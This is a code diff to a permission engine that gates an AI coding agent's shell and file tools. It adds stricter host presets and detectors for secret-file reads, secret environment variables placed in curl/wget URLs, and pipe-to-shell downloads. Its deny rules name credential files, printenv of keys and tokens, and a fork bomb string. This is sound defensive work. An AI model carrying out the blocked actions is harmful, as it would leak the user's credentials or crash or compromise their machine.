@@ -11,7 +11,7 @@
 import { minimatch } from "minimatch";
 import { readFileSync, writeFileSync, statSync, appendFileSync, existsSync } from "node:fs";
 import { homedir } from "node:os";
-import { join, dirname as pathDirname } from "node:path";
+import { join, dirname as pathDirname, resolve as pathResolve } from "node:path";
 import type { LearnedRule } from "./rules.js";
 
 // ─── Types ───
@@ -302,6 +302,35 @@ export function splitBashCommandChain(command: string): string[] {
 
 const CHAIN_HELPER_EXECUTABLES = new Set(["cd", "echo", "pwd", "true", "false", ":"]);
 
+const HOST_SAFE_READ_ONLY_EXECUTABLES = new Set([
+  "ls",
+  "cat",
+  "head",
+  "tail",
+  "grep",
+  "rg",
+  "find",
+  "wc",
+  "diff",
+  "tree",
+  "jq",
+  "sort",
+  "uniq",
+  "cut",
+  "stat",
+  "file",
+]);
+
+const HOST_SAFE_GIT_SUBCOMMANDS = new Set([
+  "status",
+  "log",
+  "diff",
+  "show",
+  "branch",
+  "blame",
+  "rev-parse",
+]);
+
 // ─── Data Egress Detection ───
 
 /**
@@ -325,6 +354,146 @@ const CURL_DATA_FLAGS = new Set([
 const CURL_WRITE_METHODS = new Set(["POST", "PUT", "DELETE", "PATCH"]);
 
 const WGET_DATA_FLAGS = new Set(["--post-data", "--post-file"]);
+
+const SECRET_ENV_HINTS = ["KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "AUTH"];
+
+const SECRET_FILE_READ_EXECUTABLES = new Set([
+  "cat",
+  "head",
+  "tail",
+  "less",
+  "more",
+  "grep",
+  "rg",
+  "awk",
+  "sed",
+]);
+
+/**
+ * Split a command segment into pipeline stages.
+ *
+ * Handles unescaped `|` outside quotes. Keeps quoted/escaped pipes intact.
+ */
+export function splitPipelineStages(segment: string): string[] {
+  const stages: string[] = [];
+  let current = "";
+  let inSingle = false;
+  let inDouble = false;
+  let escaped = false;
+
+  const pushCurrent = () => {
+    const trimmed = current.trim();
+    if (trimmed) stages.push(trimmed);
+    current = "";
+  };
+
+  for (let i = 0; i < segment.length; i++) {
+    const ch = segment[i];
+    const next = segment[i + 1];
+
+    if (escaped) {
+      current += ch;
+      escaped = false;
+      continue;
+    }
+
+    if (ch === "\\") {
+      current += ch;
+      escaped = true;
+      continue;
+    }
+
+    if (ch === "'" && !inDouble) {
+      inSingle = !inSingle;
+      current += ch;
+      continue;
+    }
+
+    if (ch === '"' && !inSingle) {
+      inDouble = !inDouble;
+      current += ch;
+      continue;
+    }
+
+    if (!inSingle && !inDouble && ch === "|" && next !== "|") {
+      pushCurrent();
+      continue;
+    }
+
+    current += ch;
+  }
+
+  pushCurrent();
+  return stages.length > 0 ? stages : [segment.trim()].filter(Boolean);
+}
+
+function isLikelySecretEnvName(envName: string): boolean {
+  const upper = envName.toUpperCase();
+  return SECRET_ENV_HINTS.some((hint) => upper.includes(hint));
+}
+
+/**
+ * Detect likely secret env expansion in curl/wget URL arguments.
+ *
+ * Example: curl "https://x.test/?token=$OPENAI_API_KEY"
+ */
+export function hasSecretEnvExpansionInUrl(parsed: ParsedCommand): boolean {
+  if (parsed.executable !== "curl" && parsed.executable !== "wget") return false;
+
+  const envRef = /\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*))/g;
+
+  for (const arg of parsed.args) {
+    const lowerArg = arg.toLowerCase();
+    if (!lowerArg.includes("http://") && !lowerArg.includes("https://")) continue;
+
+    let match: RegExpExecArray | null;
+    while ((match = envRef.exec(arg)) !== null) {
+      const envName = match[1] || match[2];
+      if (envName && isLikelySecretEnvName(envName)) {
+        return true;
+      }
+    }
+  }
+
+  return false;
+}
+
+function isSecretPath(pathCandidate: string): boolean {
+  const normalized = pathCandidate.trim().replace(/^['"]|['"]$/g, "").toLowerCase();
+
+  if (!normalized || normalized === "-" || normalized.startsWith("-")) return false;
+
+  if (
+    normalized.includes("/.ssh/") ||
+    normalized.startsWith("~/.ssh/") ||
+    normalized.includes("/.aws/") ||
+    normalized.startsWith("~/.aws/") ||
+    normalized.includes("/.gnupg/") ||
+    normalized.startsWith("~/.gnupg/")
+  ) {
+    return true;
+  }
+
+  return (
+    normalized === ".env" ||
+    normalized.startsWith(".env.") ||
+    normalized.endsWith("/.env") ||
+    normalized.includes("/.env.")
+  );
+}
+
+/**
+ * Detect direct secret-file reads via common file-reading commands.
+ */
+export function isSecretFileRead(parsed: ParsedCommand): boolean {
+  const executable = parsed.executable.includes("/")
+    ? parsed.executable.split("/").pop() || parsed.executable
+    : parsed.executable;
+
+  if (!SECRET_FILE_READ_EXECUTABLES.has(executable)) return false;
+
+  return parsed.args.some((arg) => isSecretPath(arg));
+}
 
 /**
  * Detect if a parsed command sends data to an external service.
@@ -867,159 +1036,196 @@ export const PRESET_CONTAINER: PolicyPreset = {
   defaultAction: "allow",
 };
 
+const HOST_HARD_DENY: PolicyRule[] = [
+  // Credential exfiltration
+  {
+    tool: "bash",
+    pattern: "*auth.json*",
+    action: "deny",
+    label: "Protect API keys",
+    risk: "critical",
+  },
+  {
+    tool: "read",
+    pattern: "**/agent/auth.json",
+    action: "deny",
+    label: "Protect API keys",
+    risk: "critical",
+  },
+  {
+    tool: "bash",
+    pattern: "*printenv*_KEY*",
+    action: "deny",
+    label: "Protect env secrets",
+    risk: "critical",
+  },
+  {
+    tool: "bash",
+    pattern: "*printenv*_SECRET*",
+    action: "deny",
+    label: "Protect env secrets",
+    risk: "critical",
+  },
+  {
+    tool: "bash",
+    pattern: "*printenv*_TOKEN*",
+    action: "deny",
+    label: "Protect env secrets",
+    risk: "critical",
+  },
+
+  // Fork bomb
+  {
+    tool: "bash",
+    pattern: "*:(){ :|:& };*",
+    action: "deny",
+    label: "Fork bomb",
+    risk: "critical",
+  },
+];
+
+const HOST_EXTERNAL_ASK_RULES: PolicyRule[] = [
+  // ── External actions → ask ──
+  // Only gate things that act on the user's behalf on external systems.
+
+  // Git push (writes to remotes)
+  {
+    tool: "bash",
+    exec: "git",
+    pattern: "git push*",
+    action: "ask",
+    label: "Git push",
+    risk: "medium",
+  },
+
+  // Package publishing
+  {
+    tool: "bash",
+    exec: "npm",
+    pattern: "npm publish*",
+    action: "ask",
+    label: "npm publish",
+    risk: "high",
+  },
+  {
+    tool: "bash",
+    exec: "yarn",
+    pattern: "yarn publish*",
+    action: "ask",
+    label: "yarn publish",
+    risk: "high",
+  },
+  {
+    tool: "bash",
+    exec: "twine",
+    pattern: "twine upload*",
+    action: "ask",
+    label: "PyPI upload",
+    risk: "high",
+  },
+
+  // Remote access
+  { tool: "bash", exec: "ssh", action: "ask", label: "SSH connection", risk: "high" },
+  { tool: "bash", exec: "scp", action: "ask", label: "SCP transfer", risk: "high" },
+  { tool: "bash", exec: "sftp", action: "ask", label: "SFTP transfer", risk: "high" },
+
+  // Local host-control flows (explicit approval required in host mode)
+  {
+    tool: "bash",
+    pattern: "*ios/scripts/build-install.sh*",
+    action: "ask",
+    label: "Reinstall iOS app",
+    risk: "high",
+  },
+  {
+    tool: "bash",
+    exec: "xcrun",
+    pattern: "xcrun devicectl device install app*",
+    action: "ask",
+    label: "Install app on physical device",
+    risk: "high",
+  },
+  {
+    tool: "bash",
+    pattern: "*scripts/ios-dev-up.sh*",
+    action: "ask",
+    label: "Restart pi-remote server and deploy app",
+    risk: "high",
+  },
+  {
+    tool: "bash",
+    exec: "npx",
+    pattern: "npx tsx src/index.ts serve*",
+    action: "ask",
+    label: "Start/restart pi-remote server",
+    risk: "high",
+  },
+  {
+    tool: "bash",
+    exec: "tsx",
+    pattern: "tsx src/index.ts serve*",
+    action: "ask",
+    label: "Start/restart pi-remote server",
+    risk: "high",
+  },
+];
+
 /**
- * Host preset — for pi running directly on the Mac with no container.
+ * Host preset (developer trust mode) — for pi running directly on the Mac.
  *
- * Philosophy: behave like the pi CLI. Pi runs tools freely; the gate
- * only intercepts things that act on external systems on the user's
- * behalf or could exfiltrate credentials. Everything else flows through.
- *
- * This is NOT a sandbox — the user trusts the agent the same way they
- * trust pi in their terminal. The gate exists for external actions,
- * credential protection, and a few high-impact host-control flows
- * (app reinstall / server restart) that should always require approval.
+ * Philosophy: behave like pi CLI. Tools are mostly free-flowing.
+ * The gate asks only for external/high-impact actions and denies secret exfil.
  */
 export const PRESET_HOST: PolicyPreset = {
   name: "host",
-  hardDeny: [
-    // Credential exfiltration
-    {
-      tool: "bash",
-      pattern: "*auth.json*",
-      action: "deny",
-      label: "Protect API keys",
-      risk: "critical",
-    },
-    {
-      tool: "read",
-      pattern: "**/agent/auth.json",
-      action: "deny",
-      label: "Protect API keys",
-      risk: "critical",
-    },
-    {
-      tool: "bash",
-      pattern: "*printenv*_KEY*",
-      action: "deny",
-      label: "Protect env secrets",
-      risk: "critical",
-    },
-    {
-      tool: "bash",
-      pattern: "*printenv*_SECRET*",
-      action: "deny",
-      label: "Protect env secrets",
-      risk: "critical",
-    },
-    {
-      tool: "bash",
-      pattern: "*printenv*_TOKEN*",
-      action: "deny",
-      label: "Protect env secrets",
-      risk: "critical",
-    },
-
-    // Fork bomb
-    {
-      tool: "bash",
-      pattern: "*:(){ :|:& };*",
-      action: "deny",
-      label: "Fork bomb",
-      risk: "critical",
-    },
-  ],
-  rules: [
-    // ── External actions → ask ──
-    // Only gate things that act on the user's behalf on external systems.
-
-    // Git push (writes to remotes)
-    {
-      tool: "bash",
-      exec: "git",
-      pattern: "git push*",
-      action: "ask",
-      label: "Git push",
-      risk: "medium",
-    },
-
-    // Package publishing
-    {
-      tool: "bash",
-      exec: "npm",
-      pattern: "npm publish*",
-      action: "ask",
-      label: "npm publish",
-      risk: "high",
-    },
-    {
-      tool: "bash",
-      exec: "yarn",
-      pattern: "yarn publish*",
-      action: "ask",
-      label: "yarn publish",
-      risk: "high",
-    },
-    {
-      tool: "bash",
-      exec: "twine",
-      pattern: "twine upload*",
-      action: "ask",
-      label: "PyPI upload",
-      risk: "high",
-    },
-
-    // Remote access
-    { tool: "bash", exec: "ssh", action: "ask", label: "SSH connection", risk: "high" },
-    { tool: "bash", exec: "scp", action: "ask", label: "SCP transfer", risk: "high" },
-    { tool: "bash", exec: "sftp", action: "ask", label: "SFTP transfer", risk: "high" },
-
-    // Local host-control flows (explicit approval required in host mode)
-    {
-      tool: "bash",
-      pattern: "*ios/scripts/build-install.sh*",
-      action: "ask",
-      label: "Reinstall iOS app",
-      risk: "high",
-    },
-    {
-      tool: "bash",
-      exec: "xcrun",
-      pattern: "xcrun devicectl device install app*",
-      action: "ask",
-      label: "Install app on physical device",
-      risk: "high",
-    },
-    {
-      tool: "bash",
-      pattern: "*scripts/ios-dev-up.sh*",
-      action: "ask",
-      label: "Restart pi-remote server and deploy app",
-      risk: "high",
-    },
-    {
-      tool: "bash",
-      exec: "npx",
-      pattern: "npx tsx src/index.ts serve*",
-      action: "ask",
-      label: "Start/restart pi-remote server",
-      risk: "high",
-    },
-    {
-      tool: "bash",
-      exec: "tsx",
-      pattern: "tsx src/index.ts serve*",
-      action: "ask",
-      label: "Start/restart pi-remote server",
-      risk: "high",
-    },
-  ],
-  // Like the pi CLI — allow by default, except explicitly gated high-impact actions.
+  hardDeny: HOST_HARD_DENY,
+  rules: HOST_EXTERNAL_ASK_RULES,
   defaultAction: "allow",
+};
+
+/**
+ * Host preset (standard mode) — approval-first on host runtime.
+ *
+ * Philosophy: safer defaults for non-technical users.
+ * - read-only actions in workspace bounds auto-allow
+ * - external/high-impact actions ask
+ * - everything else asks by default
+ */
+export const PRESET_HOST_STANDARD: PolicyPreset = {
+  name: "host_standard",
+  hardDeny: HOST_HARD_DENY,
+  rules: HOST_EXTERNAL_ASK_RULES,
+  defaultAction: "ask",
+};
+
+/**
+ * Host preset (locked mode) — deny unknowns on host runtime.
+ *
+ * Philosophy: high-control environment.
+ * - read-only actions in workspace bounds auto-allow
+ * - known tools ask for explicit user approval
+ * - unknown tools are denied by default
+ */
+export const PRESET_HOST_LOCKED: PolicyPreset = {
+  name: "host_locked",
+  hardDeny: HOST_HARD_DENY,
+  rules: [
+    ...HOST_EXTERNAL_ASK_RULES,
+    { tool: "read", action: "ask", label: "Read file", risk: "medium" },
+    { tool: "find", action: "ask", label: "Find files", risk: "medium" },
+    { tool: "ls", action: "ask", label: "List directory", risk: "medium" },
+    { tool: "write", action: "ask", label: "Write file", risk: "high" },
+    { tool: "edit", action: "ask", label: "Edit file", risk: "high" },
+    { tool: "bash", action: "ask", label: "Command execution", risk: "high" },
+  ],
+  defaultAction: "deny",
 };
 
 export const PRESETS: Record<string, PolicyPreset> = {
   container: PRESET_CONTAINER,
   host: PRESET_HOST,
+  host_standard: PRESET_HOST_STANDARD,
+  host_locked: PRESET_HOST_LOCKED,
 };
 
 // ─── Per-Session Config ───
@@ -1049,10 +1255,9 @@ export interface PolicyConfig {
   allowedExecutables?: string[];
 }
 
-// Note: READ_ONLY_EXECUTABLES, GIT_WRITE_SUBCOMMANDS, DANGEROUS_ENV_VARS
-// were removed when the host preset was simplified to default-allow (like pi CLI).
-// The gate catches external actions, credential access, and a small set of
-// high-impact host-control flows (app reinstall / server restart).
+// Host standard/locked presets reuse the same policy engine with extra
+// constrained-host heuristics (safe read-only bash + workspace path bounds)
+// implemented in evaluate().
 
 // ─── Policy Engine ───
 
@@ -1098,6 +1303,34 @@ export class PolicyEngine {
       }
     }
 
+    // Layer 1.1: Structural hard denies (immutable)
+    const structuralHardDeny = this.evaluateStructuralHardDeny(tool, input);
+    if (structuralHardDeny) {
+      return structuralHardDeny;
+    }
+
+    // Layer 1.25: Constrained host auto-allow (safe read-only commands)
+    // Applies only to host_standard / host_locked presets.
+    if (tool === "bash") {
+      const command = (input as { command?: string }).command || "";
+      if (this.isConstrainedHostPreset() && this.isSafeReadOnlyHostBash(command)) {
+        return {
+          action: "allow",
+          reason: "Host read-only command",
+          risk: "low",
+          layer: "rule",
+          ruleLabel: "Host safe read-only",
+        };
+      }
+    }
+
+    // Layer 1.3: Constrained host path bounds (file tools)
+    // Auto-allows reads/writes only when inside configured workspace paths.
+    const constrainedPathDecision = this.evaluateConstrainedHostPathAccess(tool, input);
+    if (constrainedPathDecision) {
+      return constrainedPathDecision;
+    }
+
     // Layer 1.5: Structural heuristics (not glob-based)
     // These catch patterns that glob rules can't express reliably.
     if (tool === "bash") {
@@ -1105,33 +1338,44 @@ export class PolicyEngine {
       const segments = splitBashCommandChain(command);
 
       for (const segment of segments) {
-        const parsed = parseBashCommand(segment);
-
-        // Pipe to shell — curl/wget piped to sh/bash is remote code execution
-        if (parsed.hasPipe && /\|\s*(ba)?sh\b/.test(segment)) {
-          const downloader = parsed.executable;
-          if (downloader === "curl" || downloader === "wget") {
-            return {
-              action: "ask",
-              reason: "Pipe to shell (remote code execution)",
-              risk: "high",
-              layer: "rule",
-              ruleLabel: "Pipe to shell",
-            };
-          }
-        }
-
-        // Data egress — curl/wget with flags that send data externally.
-        // Catches: curl -d, curl --data, curl -F, curl --upload-file,
-        //          curl -X POST/PUT/DELETE/PATCH, wget --post-data, etc.
-        if (isDataEgress(parsed)) {
+        // Pipe to shell — curl/wget piped to sh/bash is remote code execution.
+        // Match downloader anywhere in the pipeline, not only first stage.
+        if (/(^|\|)\s*(curl|wget)\b/.test(segment) && /\|\s*(ba)?sh\b/.test(segment)) {
           return {
             action: "ask",
-            reason: "Outbound data transfer",
-            risk: "medium",
+            reason: "Pipe to shell (remote code execution)",
+            risk: "high",
             layer: "rule",
-            ruleLabel: "Data egress",
+            ruleLabel: "Pipe to shell",
           };
+        }
+
+        const stages = splitPipelineStages(segment);
+        for (const stage of stages) {
+          const parsed = parseBashCommand(stage);
+
+          // Data egress — curl/wget with flags that send data externally.
+          // Catches: curl -d, curl --data, curl -F, curl --upload-file,
+          //          curl -X POST/PUT/DELETE/PATCH, wget --post-data, etc.
+          if (isDataEgress(parsed)) {
+            return {
+              action: "ask",
+              reason: "Outbound data transfer",
+              risk: "medium",
+              layer: "rule",
+              ruleLabel: "Data egress",
+            };
+          }
+
+          if (hasSecretEnvExpansionInUrl(parsed)) {
+            return {
+              action: "ask",
+              reason: "Possible secret env exfiltration in URL",
+              risk: "high",
+              layer: "rule",
+              ruleLabel: "Secret env expansion in URL",
+            };
+          }
         }
       }
     }
@@ -1221,6 +1465,12 @@ export class PolicyEngine {
           ruleLabel: rule.label,
         };
       }
+    }
+
+    // Layer 2.5: Workspace configured executable allowlist (constrained host presets)
+    const configuredExecDecision = this.evaluateConfiguredExecutableAllow(tool, input);
+    if (configuredExecDecision) {
+      return configuredExecDecision;
     }
 
     // Layer 3: Default
@@ -1350,6 +1600,12 @@ export class PolicyEngine {
           ruleLabel: rule.label,
         };
       }
+    }
+
+    // Layer 1.1: Structural hard denies (immutable)
+    const structuralHardDeny = this.evaluateStructuralHardDeny(tool, input);
+    if (structuralHardDeny) {
+      return structuralHardDeny;
     }
 
     // Layer 2: Learned deny rules (explicit deny always wins, but respects scope)
@@ -1663,6 +1919,47 @@ export class PolicyEngine {
     return {};
   }
 
+  private evaluateStructuralHardDeny(
+    tool: string,
+    input: Record<string, unknown>,
+  ): PolicyDecision | null {
+    if (tool === "read") {
+      const path = (input as { path?: string }).path;
+      if (path && isSecretPath(path)) {
+        return {
+          action: "deny",
+          reason: "Blocked access to secret credential files",
+          risk: "critical",
+          layer: "hard_deny",
+          ruleLabel: "Protect secret files",
+        };
+      }
+    }
+
+    if (tool === "bash") {
+      const command = (input as { command?: string }).command || "";
+      const segments = splitBashCommandChain(command);
+
+      for (const segment of segments) {
+        const stages = splitPipelineStages(segment);
+        for (const stage of stages) {
+          const parsed = parseBashCommand(stage);
+          if (!isSecretFileRead(parsed)) continue;
+
+          return {
+            action: "deny",
+            reason: "Blocked access to secret credential files",
+            risk: "critical",
+            layer: "hard_deny",
+            ruleLabel: "Protect secret files",
+          };
+        }
+      }
+    }
+
+    return null;
+  }
+
   /**
    * Check if a learned rule matches the current request.
    */
@@ -1712,18 +2009,143 @@ export class PolicyEngine {
     return true;
   }
 
+  private isConstrainedHostPreset(): boolean {
+    return this.preset.name === "host_standard" || this.preset.name === "host_locked";
+  }
+
+  private normalizeExecutable(exec: string): string {
+    return exec.includes("/") ? exec.split("/").pop() || exec : exec;
+  }
+
+  private isPathWithinRoot(path: string, root: string): boolean {
+    const normalizedPath = pathResolve(path);
+    const normalizedRoot = pathResolve(root);
+    return normalizedPath === normalizedRoot || normalizedPath.startsWith(normalizedRoot + "/");
+  }
+
+  /**
+   * Constrained host profile: auto-allow file tools only within configured paths.
+   */
+  private evaluateConstrainedHostPathAccess(
+    tool: string,
+    input: Record<string, unknown>,
+  ): PolicyDecision | null {
+    if (!this.isConstrainedHostPreset()) return null;
+    if (![
+      "read",
+      "write",
+      "edit",
+      "find",
+      "ls",
+    ].includes(tool)) {
+      return null;
+    }
+
+    const path = (input as { path?: string }).path;
+    if (!path || !path.startsWith("/")) {
+      return null;
+    }
+
+    const needsWrite = tool === "write" || tool === "edit";
+    const allowed = this.config.allowedPaths.some((entry) => {
+      if (!this.isPathWithinRoot(path, entry.path)) return false;
+      if (!needsWrite) return true;
+      return entry.access === "readwrite";
+    });
+
+    if (!allowed) return null;
+
+    return {
+      action: "allow",
+      reason: "Within workspace path bounds",
+      risk: "low",
+      layer: "rule",
+      ruleLabel: "Path bounds",
+    };
+  }
+
+  /**
+   * Constrained host profile: auto-allow plain read-only bash commands.
+   *
+   * Safety requirements:
+   * - every command segment must be read-only
+   * - no pipes, redirects, or subshells
+   * - git limited to read-only subcommands
+   */
+  private isSafeReadOnlyHostBash(command: string): boolean {
+    const segments = splitBashCommandChain(command);
+    if (segments.length === 0) return false;
+
+    for (const segment of segments) {
+      const parsed = parseBashCommand(segment);
+      const exec = this.normalizeExecutable(parsed.executable);
+      if (!exec) return false;
+
+      // Helpers are always safe for chaining.
+      if (CHAIN_HELPER_EXECUTABLES.has(exec)) continue;
+
+      // Complex shell features are not considered read-only-safe.
+      if (parsed.hasPipe || parsed.hasRedirect || parsed.hasSubshell) {
+        return false;
+      }
+
+      if (HOST_SAFE_READ_ONLY_EXECUTABLES.has(exec)) continue;
+
+      if (exec === "git") {
+        const subcommand = parsed.args[0] || "";
+        if (HOST_SAFE_GIT_SUBCOMMANDS.has(subcommand)) continue;
+      }
+
+      return false;
+    }
+
+    return true;
+  }
+
+  /**
+   * Workspace-level executable allowlist for constrained host presets.
+   *
+   * Only applies to simple, single-segment commands. This keeps
+   * allowlist semantics predictable and avoids hidden chain escalation.
+   */
+  private evaluateConfiguredExecutableAllow(
+    tool: string,
+    input: Record<string, unknown>,
+  ): PolicyDecision | null {
+    if (!this.isConstrainedHostPreset()) return null;
+    if (tool !== "bash") return null;
+
+    const allowedExecs = this.config.allowedExecutables;
+    if (!allowedExecs || allowedExecs.length === 0) return null;
+
+    const command = (input as { command?: string }).command || "";
+    const segments = splitBashCommandChain(command);
+    if (segments.length !== 1) return null;
+
+    const parsed = parseBashCommand(segments[0]);
+    const exec = this.normalizeExecutable(parsed.executable);
+    if (!exec) return null;
+
+    if (parsed.hasPipe || parsed.hasRedirect || parsed.hasSubshell) {
+      return null;
+    }
+
+    if (!allowedExecs.includes(exec)) return null;
+
+    return {
+      action: "allow",
+      reason: `Workspace allowlist: ${exec}`,
+      risk: "low",
+      layer: "rule",
+      ruleLabel: "Workspace executable allowlist",
+    };
+  }
+
   getPresetName(): string {
     return this.preset.name;
   }
 
   // ─── Internal ───
-
-  /**
-   * Check if a file path is within an allowed directory.
-   * Returns an allow decision if permitted, null if no match (falls through to default).
-   */
-  // checkPathAccess removed — host preset now defaults to allow (like pi CLI).
-  // Path boundary enforcement is handled by container isolation, not policy.
 
   private matchesRule(rule: PolicyRule, tool: string, input: Record<string, unknown>): boolean {
     // Check tool name
